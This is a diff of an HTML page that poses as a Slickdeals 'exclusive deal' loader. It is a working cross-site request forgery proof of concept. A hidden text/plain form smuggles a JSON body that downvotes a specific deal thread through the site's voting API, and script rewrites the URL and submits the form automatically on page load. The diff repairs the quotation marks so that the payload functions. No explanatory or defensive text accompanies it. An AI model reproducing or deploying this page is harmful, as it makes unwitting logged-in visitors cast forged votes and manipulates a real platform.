@@ -1,15 +1,16 @@
+<!DOCTYPE html>
 <html>
 <head>
 <title>Slickdeals - Special Offer!</title>
 </head>
 <body>
 <h1>Loading your exclusive deal…</h1>
-<form id=“csrfForm” action=“https://slickdeals.net/web-api/mutation/addVote/” method=“POST” enctype=“text/plain”>
-<input type=“hidden” name=’{“actionSource”:“Nuxt DDP Community Voting”,“vote”:“THUMBS_DOWN”,“dealId”:“thread-18710731”,“downvoteReason”:“OTHER”,“hack”:"’ value=’"}’ />
+<form id="csrfForm" action="https://slickdeals.net/web-api/mutation/addVote/" method="POST" enctype="text/plain">
+<input type="hidden" name='{"actionSource":"Nuxt DDP Community Voting","vote":"THUMBS_DOWN","dealId":"thread-18710731","downvoteReason":"OTHER","hack":"' value='"}'>
 </form>
 <script>
-history.pushState(’’, ‘’, ‘/’);
-document.getElementById(‘csrfForm’).submit();
+history.pushState('', '', '/');
+document.getElementById('csrfForm').submit();
 </script>
 </body>
 </html>
